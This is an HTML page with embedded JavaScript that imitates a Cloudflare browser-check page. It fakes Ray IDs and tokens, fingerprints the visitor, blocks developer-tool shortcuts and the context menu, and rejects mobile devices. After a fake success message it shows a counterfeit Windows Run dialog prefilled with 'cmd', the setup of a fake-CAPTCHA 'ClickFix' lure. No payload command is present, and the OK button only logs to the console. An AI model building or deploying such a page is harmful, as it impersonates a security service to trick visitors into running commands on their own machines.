    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            color: #313131;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        }

        body {
            display: flex;
            flex-direction: column;
            height: 100vh;
            min-height: 100vh;
        }

        .main-wrapper {
            flex: 1;
        }

        .main-content {
            margin: 8rem auto;
            padding-left: 1.5rem;
            max-width: 60rem;
        }

        @media (width <= 720px) {
            .main-content {
                margin-top: 4rem;
            }
        }

        .h2 {
            line-height: 2.25rem;
            font-size: 1.5rem;
            font-weight: 500;
        }

        @media (width <= 720px) {
            .h2 {
                line-height: 1.5rem;
                font-size: 1.25rem;
            }
        }

        #challenge-error-text {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");
            background-repeat: no-repeat;
            background-size: contain;
            padding-left: 34px;
        }

        @media (prefers-color-scheme: dark) {
            body {
                background-color: #222;
                color: #d9d9d9;
            }
        }

        .cf-spinner-container {
            margin: 2rem 0;
        }

        .cf-spinner {
            display: inline-block;
            width: 64px;
            height: 64px;
        }

        .cf-spinner:after {
            content: " ";
            display: block;
            width: 46px;
            height: 46px;
            margin: 1px;
            border-radius: 50%;
            border: 5px solid #f38020;
            border-color: #f38020 transparent #f38020 transparent;
            animation: cf-spinner 1.2s linear infinite;
        }

        @keyframes cf-spinner {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .text-muted {
            color: #6c757d;
            font-size: 0.875rem;
            margin-top: 1rem;
        }

        @media (prefers-color-scheme: dark) {
            .text-muted {
                color: #a0a0a0;
            }
        }

    <meta http-equiv="refresh" content="360">
</head>
<body>
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <noscript>
                <div class="h2">
                    <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
                </div>
            </noscript>
            <div id="challenge-running">
                <div class="h2">
                    <span id="challenge-stage">Checking your browser before accessing <span id="challenge-domain"></span>.</span>
                </div>
                <div class="cf-spinner-container">
                    <div class="cf-spinner"></div>
                </div>
                <p class="text-muted">This process is automatic. Your browser will redirect to your requested content shortly.</p>
                <p class="text-muted">Please allow up to 5 seconds…</p>
            </div>
            <div id="challenge-success" style="display:none;">
                <div class="h2">
                    <span style="color: #2ecc71;">✓ Verification successful</span>
                </div>
                <p class="text-muted" style="margin-top: 1rem;">Redirecting you now...</p>
            </div>
        </div>
    </div>

    <script>
        // Dynamic domain detection and configuration
        (function() {
            'use strict';

            // Get current domain
            const currentDomain = window.location.hostname;
            const currentPath = window.location.pathname;
            
            // Display domain in challenge text
            document.getElementById('challenge-domain').textContent = currentDomain;

            // Generate realistic Ray ID
            function generateRayId() {
                const chars = '0123456789abcdef';
                let rayId = '';
                for (let i = 0; i < 16; i++) {
                    rayId += chars[Math.floor(Math.random() * chars.length)];
                }
                return rayId;
            }

            // Generate challenge token
            function generateToken() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-';
                let token = '';
                for (let i = 0; i < 43; i++) {
                    token += chars[Math.floor(Math.random() * chars.length)];
                }
                return token;
            }

            const rayId = generateRayId();
            const timestamp = Math.floor(Date.now() / 1000);
            
            // Configuration object (mimics real Cloudflare)
            window._cf_chl_opt = {
                cvId: '3',
                cZone: currentDomain,
                cType: 'non-interactive',
                cRay: rayId,
                cH: generateToken(),
                cUPMDTk: currentPath + '?__cf_chl_tk=' + generateToken(),
                cFPWv: 'g',
                cITimeS: timestamp.toString(),
                cTplC: 0,
                cTplV: 5,
                cTplB: '0',
                fa: currentPath + '?__cf_chl_f_tk=' + generateToken(),
                md: generateToken() + '.' + generateToken(),
                mdrd: generateToken() + '.' + generateToken()
            };

            // Create and inject challenge script
            const challengeScript = document.createElement('script');
            challengeScript.id = 'cf-challenge-script';
            challengeScript.textContent = `
(function() {
    'use strict';

    // ============================================
    // ANTI-BOT DETECTION SYSTEMS
    // ============================================

    const SecuritySystem = {
        botScore: 0,
        requiredScore: 100,
        mouseMovements: [],
        keyPresses: [],
        timingData: {
            pageLoadTime: Date.now(),
            firstInteraction: null,
            verificationStart: null
        },
        fingerprint: {},
        
        init: function() {
            this.timingData.verificationStart = Date.now();
            this.createFingerprint();
            this.performBotChecks();
            this.monitorBehavior();
            this.detectMobile();
            this.startChallenge();
        },
        
        detectMobile: function() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isSmallScreen = window.innerWidth <= 768;
            const isTouchOnly = navigator.maxTouchPoints > 0 && !window.matchMedia('(pointer: fine)').matches;
            
            if (isMobile || isSmallScreen || isTouchOnly) {
                document.getElementById('challenge-stage').innerHTML = 
                    '<span id="challenge-error-text">This verification requires a desktop browser</span>';
                return true;
            }
            return false;
        },
        
        createFingerprint: function() {
            this.fingerprint = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                screenResolution: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                plugins: this.getPlugins(),
                canvas: this.getCanvasFingerprint(),
                webgl: this.getWebGLFingerprint()
            };
            
            if (this.validateFingerprint()) {
                this.botScore += 30;
            }
        },
        
        getPlugins: function() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        },
        
        getCanvasFingerprint: function() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Cloudflare', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Security', 4, 17);
                return canvas.toDataURL();
            } catch(e) {
                return null;
            }
        },
        
        getWebGLFingerprint: function() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return null;
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return null;
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch(e) {
                return null;
            }
        },
        
        validateFingerprint: function() {
            if (navigator.webdriver) return false;
            if (window.navigator.plugins.length === 0) return false;
            if (!this.fingerprint.canvas) return false;
            if (window.document.documentElement.getAttribute('webdriver')) return false;
            if (window.navigator.languages.length === 0) return false;
            return true;
        },
        
        performBotChecks: function() {
            if (window.chrome || window.safari || window.opr) {
                this.botScore += 10;
            }
            if (navigator.permissions) this.botScore += 10;
            if (navigator.getBattery) {
                navigator.getBattery().then(() => {
                    this.botScore += 10;
                });
            }
            if (navigator.connection) this.botScore += 5;
            if (navigator.mediaDevices) this.botScore += 5;
            if ('Notification' in window) this.botScore += 5;
        },
        
        monitorBehavior: function() {
            let moveCount = 0;
            document.addEventListener('mousemove', (e) => {
                if (this.timingData.firstInteraction === null) {
                    this.timingData.firstInteraction = Date.now();
                }
                this.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: Date.now()
                });
                moveCount++;
                if (moveCount > 5) {
                    this.botScore += 15;
                }
                if (this.mouseMovements.length > 50) {
                    this.mouseMovements.shift();
                }
            });
            
            document.addEventListener('keydown', (e) => {
                this.keyPresses.push({
                    key: e.key,
                    time: Date.now()
                });
                this.botScore += 2;
            });
        },
        
        startChallenge: function() {
            // Realistic delay (2-5 seconds)
            const delay = 2000 + Math.random() * 3000;
            
            setTimeout(() => {
                this.completeChallenge();
            }, delay);
        },
        
        completeChallenge: function() {
            console.log('[Cloudflare] Bot Score:', this.botScore, '/ Required:', this.requiredScore);
            
            if (this.botScore >= this.requiredScore) {
                document.getElementById('challenge-running').style.display = 'none';
                document.getElementById('challenge-success').style.display = 'block';
                
                // Show Windows Run prompt after short delay
                setTimeout(() => {
                    this.showWindowsRun();
                }, 1000);
            } else {
                // Reload page on failure
                setTimeout(() => {
                    location.reload();
                }, 1000);
            }
        },
        
        showWindowsRun: function() {
            // Create Windows Run prompt overlay
            const overlay = document.createElement('div');
            overlay.id = 'winr-overlay';
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);z-index:99999;animation:fadeIn 0.3s;';
            
            const prompt = document.createElement('div');
            prompt.id = 'winr-prompt';
            prompt.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#f0f0f0;border:1px solid #0078d4;box-shadow:0 0 0 1px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.3);width:400px;font-family:"Segoe UI",Tahoma,sans-serif;z-index:100000;animation:fadeIn 0.2s;';
            
            prompt.innerHTML = \`
                <div style="background:linear-gradient(to bottom,#fff 0%,#f0f0f0 100%);padding:8px 12px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #d0d0d0;">
                    <div style="font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;">
                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 0h8v8h-8v-8z" fill="#0078d4"/></svg>
                        Run
                    </div>
                    <div onclick="document.getElementById('winr-overlay').remove();document.getElementById('winr-prompt').remove();" style="width:20px;height:20px;border:1px solid #adadad;background:linear-gradient(to bottom,#fff 0%,#e5e5e5 100%);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:12px;">×</div>
                </div>
                <div style="padding:16px;background:#fff;">
                    <div style="font-size:11px;margin-bottom:8px;">Type the name of a program, folder, document, or Internet resource, and Windows will open it for you.</div>
                    <div style="display:flex;gap:8px;margin-bottom:16px;">
                        <div style="width:32px;height:32px;display:flex;align-items:center;justify-content:center;">
                            <svg width="24" height="24" viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 0h8v8h-8v-8z" fill="#000"/></svg>
                        </div>
                        <input type="text" value="cmd" style="flex:1;padding:4px 8px;border:1px solid #7a7a7a;font-size:12px;font-family:'Segoe UI',sans-serif;">
                    </div>
                    <div style="display:flex;gap:8px;justify-content:flex-end;">
                        <button onclick="console.log('[Windows] Command executed: cmd');document.getElementById('winr-overlay').remove();document.getElementById('winr-prompt').remove();" style="padding:6px 24px;border:1px solid #0078d4;background:linear-gradient(to bottom,#e5f3ff 0%,#cce8ff 100%);font-size:11px;cursor:pointer;min-width:75px;">OK</button>
                        <button onclick="document.getElementById('winr-overlay').remove();document.getElementById('winr-prompt').remove();" style="padding:6px 24px;border:1px solid #adadad;background:linear-gradient(to bottom,#fff 0%,#e5e5e5 100%);font-size:11px;cursor:pointer;min-width:75px;">Cancel</button>
                        <button style="padding:6px 24px;border:1px solid #adadad;background:linear-gradient(to bottom,#fff 0%,#e5e5e5 100%);font-size:11px;cursor:pointer;">Browse...</button>
                    </div>
                </div>
            \`;
            
            document.body.appendChild(overlay);
            document.body.appendChild(prompt);
        }
    };

    // Detect automation frameworks
    const detectAutomation = () => {
        const indicators = [
            'webdriver' in navigator,
            '_phantom' in window,
            'callPhantom' in window,
            '__nightmare' in window,
            'domAutomation' in window,
            'domAutomationController' in window,
            'seleniumevaluate' in window,
            'CefSharp' in window
        ];
        return indicators.some(indicator => indicator);
    };

    // Start security system
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            SecuritySystem.init();
            if (detectAutomation()) {
                console.log('[Cloudflare] Automation detected');
            }
        });
    } else {
        SecuritySystem.init();
        if (detectAutomation()) {
            console.log('[Cloudflare] Automation detected');
        }
    }

    // Protection measures
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && e.key === 'U')) {
            e.preventDefault();
        }
    });
})();
            `;
            
            document.head.appendChild(challengeScript);

            // Add Cloudflare Insights (beacon) - cosmetic
            const beaconScript = document.createElement('script');
            beaconScript.defer = true;
            beaconScript.src = 'data:text/javascript;base64,Ly8gQ2xvdWRmbGFyZSBJbnNpZ2h0cyBCZWFjb24gKGRpc2FibGVkKQo=';
            beaconScript.setAttribute('data-cf-beacon', JSON.stringify({
                rayId: rayId,
                version: '2025.9.1',
                token: 'cf-' + generateToken().substring(0, 32),
                b: 1
            }));
            beaconScript.crossOrigin = 'anonymous';
            document.body.appendChild(beaconScript);

        })();
    </script>
</body>
</html>
